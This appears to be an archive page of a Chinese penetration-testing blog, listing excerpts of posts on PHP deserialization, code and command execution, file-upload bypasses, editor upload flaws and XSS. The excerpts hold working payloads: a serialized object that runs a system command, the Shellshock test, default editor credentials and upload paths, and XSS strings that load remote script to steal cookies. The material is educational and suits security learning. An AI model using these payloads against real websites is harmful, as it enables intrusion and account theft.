
<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="generator" content="Hugo 0.55.0" />
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reber's Blog - 渗透测试|python|php </title>
    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
    <meta name="author" content="reber">
    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
    <!--[if lte IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
    <![endif]-->
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
    <!--<![endif]-->
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    <link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css">
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
    <script src="/js/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <script src="/js/jquery.min.js"></script>
</head>
<body>

<div class="reber">
    
<div class="head">
    <h1 class="logo" id="logo">
        <a href="/"><img src='/img/logo.png' width='70px'></a>
    </h1>
    <ul class="nav">
        
            
                <li>
                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
            
                </li>
        
            
                <li>
                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
            
                </li>
        
            
                <li>
                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
            
                </li>
        
    </ul>
</div>


    
<div class="main">
    <div class="left">
        <div class="content">
            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/php-deserialize-vulnerabilities/">PHP反序列化漏洞</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-25
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/deserialize">deserialize</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串
反序列化：使用函数unserialize()可将序列化的字符串还原
 服务端有test.php，代码如下  &lt;?php class fun{ public $msg; function __construct(){ echo '__construct'; } function __destruct() { eval($this-&gt;msg); } } $d = $_REQUEST['str']; var_dump($d); echo &quot;&lt;br /&gt;&quot;; $tc = unserialize($d); var_dump($tc); ?&gt;   客户端可构造如下代码生成序列化后的字符串  &lt;?php class fun{ public $msg; function __construct(){ echo '__construct'; } function __destruct() { eval($this-&gt;msg); } } $f = new fun(); $f-&gt;msg = &quot;system('ls /etc/ssh');&quot;; echo serialize($f); ?&gt;  生成的序列化字符串为：O:3:&quot;fun&quot;:1:{s:3:&quot;msg&quot;;s:22:&quot;system('ls /etc/ssh');&quot;;}
    </p>

    
    <footer>
        <a href="/posts/2016/php-deserialize-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/code-execution-vulnerabilities/">代码执行漏洞(一)</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-25
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/rce">rce</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
0x01 相关函数 PHP：eval assert Python：exec asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能  0x02 phpcms中的string2array函数 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
array( //这个是字符串形式的数组，它并不是数组，而是字符串 'upload_maxsize' =&gt; '2048', 'upload_allowext' =&gt; 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf', 'watermark_enable' =&gt; '1', 'watermark_minwidth' =&gt; '300', 'watermark_minheight' =&gt; '300', 'watermark_img' =&gt; '/statics/img/water/mark.png', 'watermark_pct' =&gt; '85', 'watermark_quality' =&gt; '80', 'watermark_pos' =&gt; '9', )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == '') return array(); @eval(&quot;\$array = $data;&quot;); return $array; }  0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器  0x04 漏洞分类(也是利用点) 执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)  0x05 漏洞挖掘 框架找漏洞，如ThinkPHP： inurl:index.
    </p>

    
    <footer>
        <a href="/posts/2016/code-execution-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/windows-proxifier-implement-global-proxy/">Windows下用Proxifier实现全局代理</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-24
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/windows">Windows</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/software">software</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         0x00 环境 在windows下用Shadowsocks和Proxifier实现全局代理：
System：Windows10 Pro x64 Shadowsocks：Shadowsocks v2.5.2.0 Proxifier：Proxifier Portable Edition v3.29  0x01 配置Shadowsocks 0x02 配置Proxifier  Proxifier添加代理服务  Proxifier添加规则  测试全局代理设置成功与否   
    </p>

    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/command-execution-vulnerabilities/">命令执行漏洞</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-24
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/rce">rce</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。  0x01 利用条件  应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严  0x02 漏洞分类  代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
system(&ldquo;/bin/program --arg $arg&rdquo;); 系统的漏洞造成命令执行
bash破壳漏洞(CVE-2014-6271)
执行env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a test&quot;后
若输出vulnerable则证明存在漏洞 调用的第三方组件存在代码执行漏洞
如WordPress中用来处理图片的ImageMagick组件
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)
ThinkPHP命令执行  0x03 漏洞危害  继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至控制服务器 进一步内网渗透 等等  0x04 漏洞挖掘 可以google hacking
尝试：filetype:action或filetype:do来找struts2
0x05 漏洞可能代码(以system为例) 1. system(&quot;$arg&quot;); //直接输入即可 2. system(&quot;/bin/prog $arg&quot;); //直接输入;ls 3. system(&quot;/bin/prog -p $arg&quot;); //和2一样 4.
    </p>

    
    <footer>
        <a href="/posts/2016/command-execution-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/">文件上传之文本编辑器上传漏洞</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-21
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/fileupload">fileupload</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         0x00 文本编辑器 常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。
0x01 FCKeditor 下面以FCKeditor(现名为CKEditor)为例：
1、敏感信息暴漏 * 查看版本信息 /FCKeditor/editor/dialog/fck_about.html * 默认上传页面 /FCKeditor/editor/filemanager/browser/default/browser.html /FCKeditor/editor/filemanager/browser/default/connectors/test.html /FCKeditor/editor/filemanager/upload/test.html /FCKeditor/editor/filemanager/connectors/test.html /FCKeditor/editor/filemanager/connectors/uploadtest.html * 其他敏感文件 /FCKeditor/editor/filemanager/connectors/aspx/connector.html /FCKeditor/editor/filemanager/connectors/asp/connector.html /FCKeditor/editor/filemanager/connectors/php/connector.php 2、黑名单策略错误 FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名 3、任意文件上传漏洞 FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行， 在form中的action=&quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; 即可，然后上传  0x02 eWebEditor 1、默认后台 2.80以前为：ewebeditor/admin_login.asp 2.80以后为：admin/login.asp 2、默认账号密码 admin admin888 3、数据库地址 默认数据库地址 ewebeditor/db/ewebeditor.mdb 常用数据库地址 ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asa ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb asp asa为后缀的数据库下载下来后改为mdb  
Reference(侵删)：  http://navisec.it/编辑器漏洞手册/  
    </p>

    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/file-upload-simple-to-bypass/">文件上传漏洞常见绕过手法</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-20
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/fileupload">fileupload</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 一般防止上传漏洞手法 1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少 //服务器开销，而服务端验证才可以真正防御攻击者。 2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法  0x01 客户端检测 客户端验证代码形如下：
&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;图片上传&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function checkFile(){ var flag = false; var str = document.getElementById(&quot;file&quot;).value; str = str.substring(str.lastIndexOf('.') + 1); var arr = new Array('png','bmp','gif','jpg'); for (var i=0;i&lt;arr.length;i++){ if(str==arr[i]){ flag = true; } } if(!flag){ alert('文件不合法！'); } return flag; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; onsubmit=&quot;checkFile()&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;  接收文件的脚本upload.
    </p>

    
    <footer>
        <a href="/posts/2016/file-upload-simple-to-bypass/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/">文件上传漏洞与文件解析漏洞</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-20
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/fileupload">fileupload</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 文件上传漏洞 当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。 # 上传后得到的权限 1. 后台权限：登陆了后台，可以进行一些操作、配置 2. 网站权限：获得了webshell，可以进行查看源代码等操作 3. 服务器权限：可以对服务器进行任意操作  0x01 文件上传漏洞分类 1. 配置不当可直接上传shell HTTP的PUT方法开启了 2. 文件解析漏洞导致文件执行 Web容器解析漏洞 3. 本地文件上传限制被绕过 BurpSuite抓包修改即可绕过 4. 服务端过滤不严或被绕过 使用了黑名单过滤 5. 文件路径截断上传 00截断等 6. 开源编辑器上传漏洞 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞  0x02 文件上传漏洞利用条件 1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径 2. 其次,用户能从web访问这个文件 3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败  0x03 文件上传漏洞挖掘 1. 查找上传点，如图片、附件、头像的上传等 2. 找类似upload的目录、类似upload.php的文件 3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等  0x04 常见可执行文件后缀 可用于绕过： php php2 php3 php5 phtml asp aspx ascx ashx cer asa jsp jspx jspf  0x05 解析漏洞 文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等  0x06 IIS解析漏洞 IIS6.
    </p>

    
    <footer>
        <a href="/posts/2016/file-upload-and-file-parse-vuln/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/vmware-install-vm-tools/">虚拟机下安装vm-tools</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-20
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/other">Other</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA">虚拟机</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         vm-tools安装后可以在客户机和虚拟机间双向复制文件
0x00 安装 0x01 Kali2.0 一般安装的话按照上面的步骤即可安装成功，但是Kali2.0不行，可以用如下方法安装： 安装后可以终端输入：dpkg-reconfigure locales，在弹出的界面选择zh_CN.UTF-8设置语言为中文 可以用vim /root/.config/user-dirs.dirs将&quot;桌面&quot;修改为&quot;Desktop&quot;  
    </p>

    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/recording-an-stored-xss/">一次存储型XSS利用实例</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-17
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/xss">xss</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         首先感谢凯神的指导
0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
&lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a  但是这个要在点击删除时payload才起作用 也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement('script'); a.src=&quot;www.xxx.com&quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement('script');/* */a.src=&quot;www.xxx.com&quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &lt;svg/onload=&quot;b='http://t.i'&quot;&gt; &lt;svg/onload=&quot;b+='m/16ap6'&quot;&gt; &lt;svg/onload=&quot;$loadJs(b)&quot;&gt;  0x04 得到Cookie 
    </p>

    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2016/xss-basis-and-use/">XSS漏洞及其挖掘方法</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2016-07-15
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/xss">xss</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&rdquo;脚本&rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等  0x02 攻击场景 在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等  0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
 反射型XSS
  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息   存储型XSS
  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。
    </p>

    
    <footer>
        <a href="/posts/2016/xss-basis-and-use/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            

            


    
    
    <nav class="pagination" role="pagination">
        
            <a href="/page/10/"><i class="fa fa-chevron-left"></i></a>
        

        <span>&nbsp;11 / 19&nbsp;</span>
        
        
            <a href="/page/12/"><i class="fa fa-chevron-right"></i></a>
        
    </nav>


        </div>
    </div>
    <div class="right">
        

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Categorie<a href="/single/index.html" class="single" target="_blank">s</a></h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/database" title="database">database(12)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/git" title="git">git(6)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/linux" title="linux">linux(26)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/other" title="other">other(14)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(81)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/php" title="php">php(12)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/python" title="python">python(32)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/server" title="server">server(10)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/windows" title="windows">windows(4)</a>
            </li>
        
    </ul>


</div>
        

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Tags</h2>
    <div class="taglist" id="tags">
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/ajax" title="ajax">ajax</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/cgi" title="cgi">cgi</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/csrf" title="csrf">csrf</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/des" title="des">des</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/dmz" title="dmz">dmz</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/docker" title="docker">docker</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/getshell" title="getshell">getshell</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/git" title="git">git</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/https" title="https">https</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/injection" title="injection">injection</a>
                <sup>18</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/intranet" title="intranet">intranet</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/javascript" title="javascript">javascript</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/linux" title="linux">linux</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/mindmap" title="mindmap">mindmap</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/module" title="module">module</a>
                <sup>12</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/mysql" title="mysql">mysql</a>
                <sup>6</sup>
            </p>
        
